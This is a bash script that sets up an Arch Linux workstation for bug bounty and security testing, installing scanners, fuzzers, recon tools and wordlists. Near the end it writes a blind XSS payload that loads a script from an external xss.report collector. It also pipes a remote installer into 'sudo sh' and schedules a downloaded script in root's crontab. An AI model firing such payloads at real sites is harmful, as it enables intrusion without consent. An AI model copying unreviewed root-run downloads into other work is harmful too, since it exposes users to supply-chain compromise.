#!/bin/bash
# Improved Arch Linux Setup Script with Package Groups
# Workflow by aldenpartridge

set -euo pipefail  # Exit on error, undefined vars, pipe failures

# Color output for better readability
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly RED='\033[0;31m'
readonly BLUE='\033[0;34m'
readonly NC='\033[0m'

log() { echo -e "${GREEN}[INFO]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1" >&2; exit 1; }
group() { echo -e "${BLUE}[GROUP]${NC} $1"; }

# ==============================================================================
# ARGUMENT PARSING AND VALIDATION
# ==============================================================================

show_usage() {
    echo "Usage: $0 [--groups GROUP1,GROUP2,GROUP3] [--all]"
    echo ""
    echo "Available groups:"
    echo "  core        - Essential development tools (git, python, docker, etc.)"
    echo "  bountytools - Security & bug bounty tools (nmap, nuclei, subfinder, etc.)"
    echo "  extra       - Additional applications (obsidian, signal, brave, etc.)"
    echo ""
    echo "Examples:"
    echo "  $0 --groups core                # Install only core tools"
    echo "  $0 --groups core,bountytools    # Install core + bounty tools"
    echo "  $0 --all                        # Install all packages"
    echo ""
    echo "Default: --groups core,bountytools"
}

# Parse arguments
SELECTED_GROUPS=()

if [[ $# -eq 0 ]]; then
    SELECTED_GROUPS=("core" "bountytools")
elif [[ "$1" == "--all" ]]; then
    SELECTED_GROUPS=("core" "bountytools" "extra")
elif [[ "$1" == "--groups" ]]; then
    if [[ -z "${2:-}" ]]; then
        error "No groups specified. Use --help for usage."
    fi
    IFS=',' read -ra SELECTED_GROUPS <<< "$2"
elif [[ "$1" == "--help" ]] || [[ "$1" == "-h" ]]; then
    show_usage
    exit 0
else
    error "Invalid arguments. Use --help for usage."
fi

# Validate groups
valid_groups=("core" "bountytools" "extra")
for group in "${SELECTED_GROUPS[@]}"; do
    if [[ ! " ${valid_groups[*]} " =~ " $group " ]]; then
        error "Invalid group: $group. Valid groups: ${valid_groups[*]}"
    fi
done

# Check if running on Arch
if [[ ! -f /etc/arch-release ]]; then
    error "This script is optimized for Arch Linux"
fi

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

should_install() {
    local group=$1
    if [[ " ${SELECTED_GROUPS[*]} " =~ " $group " ]]; then
        return 0
    else
        return 1
    fi
}

# ==============================================================================
# PACKAGE DEFINITIONS
# ==============================================================================

# Core development packages
CORE_PACKAGES=(
    "python3" "python-pip" "python-pipx" "python-setuptools" "cmake"
    "docker" "docker-compose" "wget" "ripgrep" "jq" "btop" "fzf"
    "git" "go" "stow" "cronie" "base-devel"
)

# Security and bug bounty tools
BOUNTY_PACKAGES=(
    "rustup" "nmap" "llvm" "openbsd-netcat" "binwalk" "findomain"
    "radare2" "hashcat" "ghidra" "tor" "yubikey-personalization"
    "libfido2" "yubikey-manager" "oryx" "tickrs" "flatpak"
)

# Additional GUI applications
EXTRA_PACKAGES=(
    "obs-studio" "obsidian" "signal-desktop"
)

# Go tools for security testing
GO_TOOLS=(
    # Reconnaissance tools
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/1hehaq/oty@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/Chocapikk/wpprobe@latest"

    # Subdomain tools
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/tomnomnom/assetfinder@latest"
    "github.com/d3mondev/puredns/v2@latest"
    "github.com/aldenpartridge/chaos-dl/cmd/chaos-dl@v1.0.1"
    "github.com/owasp-amass/amass/v5/cmd/amass@main"

    # Fuzzing and scanning tools
    "github.com/ffuf/ffuf/v2@latest"
    "github.com/OJ/gobuster/v3@latest"
    "github.com/hahwul/dalfox/v2@latest"

    # Utility tools
    "github.com/tomnomnom/anew@latest"
    "github.com/trickest/mgwls@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/PentestPad/subzy@latest"
    "github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest"
    "github.com/1hehaq/recx@latest"
    "github.com/1hehaq/shef@latest"
    "github.com/jaeles-project/gospider@latest"
    "github.com/tomnomnom/hacks/anti-burl@latest"
)

# Python tools for security testing
PYTHON_TOOLS=(
    "git+https://github.com/maurosoria/dirsearch.git"
    "git+https://github.com/aboul3la/Sublist3r.git"
    "git+https://github.com/xnl-h4ck3r/xnLinkFinder.git"
    "arjun"
    "uro"
    "git+https://github.com/r0oth3x49/ghauri.git"
    "git+https://github.com/0xInfection/XSRFProbe.git"
    "bbot"
    "waymore"
)

# AUR packages
AUR_PACKAGES=(
    "mullvad-vpn"
    "mullvad-vpn-cli"
    "burpsuite"
    "aquatone-bin"
)

# Flatpak applications
FLATPAK_APPS=(
    "com.brave.Browser"
    "com.vscodium.codium"
    "dev.vencord.Vesktop"
    "com.github.KRTirtho.Spotube"
    "org.chromium.Chromium"
)

# Git repositories
GIT_REPOS=(
    "https://github.com/aldenpartridge/recon.git:~/oty-templates"
    "https://github.com/coffinxp/GFpattren.git:~/.gf/"
    "https://github.com/coffinxp/nuclei-templates.git:~/nuclei-templates"
    "https://github.com/aldenpartridge/lostfuzzer.git:~/tools/lostfuzzer"
    "https://github.com/danielmiessler/SecLists.git:~/wordlists/SecLists"
    "https://github.com/zabesec/bb.git:~/tools/bb"
)

# Configuration files
CONFIG_FILES=(
    "https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/settings.json:~/.config/VSCodium/User/settings.json:extra"
    "https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/yubikey.sh:~/sys-scripts/yubikey.sh:bountytools"
    "https://raw.githubusercontent.com/trickest/resolvers/refs/heads/main/resolvers.txt:~/.config/puredns/resolvers.txt:bountytools"
    "https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/chaos-programs.sh:~/tools/chaos-programs.sh:bountytools"
    "https://raw.githubusercontent.com/aldenpartridge/scripts/refs/heads/main/rand-serv.sh:~/sys-scripts/rand-serv.sh:core"
)

# ==============================================================================
# INSTALLATION FUNCTIONS
# ==============================================================================

install_packages() {
    local group_name=$1
    shift
    local packages=("$@")

    if should_install "$group_name"; then
        group "Installing $group_name packages..."
        failed_packages=()
        for package in "${packages[@]}"; do
            if sudo pacman -S --needed --noconfirm "$package" 2>/dev/null; then
                log "✓ $package installed/updated"
            else
                warn "✗ Failed to install $package (may already be installed or conflict)"
                failed_packages+=("$package")
            fi
        done

        if [ ${#failed_packages[@]} -gt 0 ]; then
            warn "Some $group_name packages failed to install: ${failed_packages[*]}"
            warn "This is normal if they're already installed from other sources"
        fi
    fi
}

install_go_tool() {
    local tool=$1
    local binary=$(basename "$tool" | sed 's/@latest//')

    log "Installing $binary..."
    if go install "$tool" 2>/dev/null; then
        # Create symlink if binary exists
        if [[ -f "$HOME/go/bin/$binary" ]]; then
            sudo ln -fs "$HOME/go/bin/$binary" "/usr/bin/$binary" || \
                warn "Failed to create symlink for $binary"
        fi
    else
        warn "Failed to install $binary"
    fi
}

install_python_tool() {
    local tool=$1
    log "Installing $tool..."
    pipx install "$tool" || warn "Failed to install $tool"
}

setup_cron() {
    # Get current username
    CURRENT_USER=$(whoami)

    # Check if script is already in crontab
    if sudo grep -q "rand-serv.sh" /etc/crontab 2>/dev/null; then
        echo "Cron job already exists in /etc/crontab"
        return 0
    fi

    # Add cron job for daily execution at 10 AM and 4 PM
    echo "0 10,16 * * * $CURRENT_USER ~/sys-scripts/rand-serv.sh" | sudo tee -a /etc/crontab > /dev/null

    if [ $? -eq 0 ]; then
        echo "Successfully added to /etc/crontab"
        echo "Will initiate twice daily at 10 AM and 4 PM with random execution timing"
    else
        echo "Failed to add to /etc/crontab - please run with sudo or check permissions"
        return 1
    fi
}

# ==============================================================================
# MAIN INSTALLATION PROCESS
# ==============================================================================

log "Starting Arch Linux setup with groups: ${SELECTED_GROUPS[*]}"

# Update system
log "Updating system packages..."
sudo pacman -Syu --noconfirm || error "Failed to update system"

# Create directories
log "Creating directory structure..."
if should_install "core" || should_install "bountytools"; then
    mkdir -p ~/tools ~/scripts ~/wordlists/payloads ~/bounty ~/.gf ~/.config/puredns \
             ~/Notes ~/Dev ~/Work ~/Misc ~/sys-scripts ~/nuclei-templates ~/oty-templates
fi
if should_install "extra"; then
    mkdir -p ~/.config/VSCodium/User \
             ~/.var/app/org.torproject.torbrowser-launcher/data/torbrowser/tbb/x86_64/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/
fi

# Install pacman packages by group
install_packages "core" "${CORE_PACKAGES[@]}"
install_packages "bountytools" "${BOUNTY_PACKAGES[@]}"
install_packages "extra" "${EXTRA_PACKAGES[@]}"

# Install Rust (bountytools group)
if should_install "bountytools"; then
    log "Installing Rust..."
    rustup default stable
fi

# Install paru (AUR helper) - needed for bountytools and extra
if should_install "bountytools" || should_install "extra"; then
    group "Installing paru (AUR helper)..."
    if ! command -v paru &> /dev/null; then
        git clone https://aur.archlinux.org/paru.git /tmp/paru || \
            warn "Failed to clone paru repository"
        cd /tmp/paru

        # Fix for Rust CPU optimization crashes
        export RUSTFLAGS="-C target-feature=-avx, -avx2, -bmi1, -bmi2, -fma"

        makepkg -si --noconfirm || \
            warn "Failed to install paru"
        cd - > /dev/null
        rm -rf /tmp/paru
    else
        log "paru is already installed, skipping..."
    fi
fi

# Enable services (core group)
if should_install "core"; then
    log "Enabling services..."
    sudo systemctl enable --now cronie.service
fi

# Setup Python environment (core group)
if should_install "core"; then
    log "Setting up Python environment..."
    pipx ensurepath
    sudo pipx ensurepath --global

    # Add to PATH once at the end
    log "Updating PATH..."
    {
        echo 'export PATH="$HOME/.cargo/bin:$PATH"'
        echo 'export PATH="$PATH:$HOME/go/bin"'
    } >> ~/.bashrc
fi

# Install Flatpak applications (extra group)
if should_install "extra"; then
    group "Installing Flatpak applications..."
    flatpak install -y flathub "${FLATPAK_APPS[@]}" || \
        warn "Some flatpak installations failed"
fi

# Install AUR packages (bountytools group)
if command -v paru &> /dev/null && should_install "bountytools"; then
    group "Installing AUR packages..."
    paru -S --needed --noconfirm "${AUR_PACKAGES[@]}" || \
        warn "Some AUR packages failed to install"
fi

# Install Go tools (bountytools group)
if should_install "bountytools"; then
    group "Installing Go tools..."
    for tool in "${GO_TOOLS[@]}"; do
        install_go_tool "$tool"
    done
fi

# Install Python tools (bountytools group)
if should_install "bountytools"; then
    group "Installing Python tools..."
    for tool in "${PYTHON_TOOLS[@]}"; do
        install_python_tool "$tool"
    done

    # Install Rust tools
    log "Installing Rust tools..."
    cargo install x8 || warn "Failed to install x8"
fi

# Download configuration files
if should_install "core" || should_install "bountytools" || should_install "extra"; then
    group "Downloading configurations..."
    downloads=()

    for config in "${CONFIG_FILES[@]}"; do
        IFS=':' read -r url path group <<< "$config"
        if should_install "$group"; then
            downloads+=("wget -q -O $path $url")
        fi
    done

    # Run downloads in parallel
    for cmd in "${downloads[@]}"; do
        eval "$cmd" &
    done
    wait || warn "Some downloads failed"
fi

# Clone git repositories
if should_install "bountytools"; then
    group "Cloning repositories..."
    {
        for repo in "${GIT_REPOS[@]}"; do
            IFS=':' read -r url path <<< "$repo"
            git clone "$url" "$path" &
        done
        wait
    } || warn "Some repositories failed to clone"
fi

# Build special tools (bountytools group)
if should_install "bountytools"; then
    group "Building special tools..."

    # urldedupe
    log "Building urldedupe..."
    git clone https://github.com/ameenmaali/urldedupe.git ~/tools/urldedupe || warn "Failed to clone urldedupe"
    if [[ -d ~/tools/urldedupe ]]; then
        cd ~/tools/urldedupe
        cmake CMakeLists.txt && make
        if [[ -f urldedupe ]]; then
            sudo chmod +x urldedupe
            sudo mv urldedupe /usr/bin/
        else
            warn "Failed to build urldedupe"
        fi
        cd - > /dev/null
    fi

    # Setup lostfuzzer
    if [[ -d ~/tools/lostfuzzer ]]; then
        sudo chmod +x ~/tools/lostfuzzer/lostfuzzer.sh
        sudo ln -fs ~/tools/lostfuzzer/lostfuzzer.sh /usr/bin/lostfuzzer
    fi

    # massdns
    log "Building massdns..."
    git clone https://github.com/blechschmidt/massdns.git /tmp/massdns || warn "Failed to clone massdns"
    if [[ -d /tmp/massdns ]]; then
        cd /tmp/massdns && make && cd bin
        if [[ -f massdns ]]; then
            sudo mv massdns /usr/bin/
        else
            warn "Failed to build massdns"
        fi
        cd - > /dev/null
        rm -rf /tmp/massdns
    fi

    # TruffleHog
    log "Installing TruffleHog..."
    curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin || \
        warn "Failed to install TruffleHog"

    # Rocket Crawl
    log "Installing Rocket Crawl..."
    wget -q https://raw.githubusercontent.com/MrRockettt/Rocket-Crawl/refs/heads/main/rocket-crawl.sh -O ~/tools/rocket-crawl.sh
    chmod +x ~/tools/rocket-crawl.sh

    # Create custom payload
    echo "'\"<script src=https://xss.report/c/manwithafish></script>" > ~/wordlists/payloads/bxss.txt
fi

# Setup cron job (core group)
if should_install "core" && [[ "${1:-}" != "--no-cron" ]]; then
    setup_cron
fi

# ==============================================================================
# CLEANUP
# ==============================================================================

log "Cleaning up..."
rm -f /tmp/go.tar.gz
if should_install "bountytools"; then
    chmod +x ~/sys-scripts/yubikey.sh ~/tools/chaos-programs.sh 2>/dev/null || true
fi

log "Arch Linux setup completed successfully!"
log "Run 'source ~/.bashrc' to use all installed tools."

log "Setup script finished!"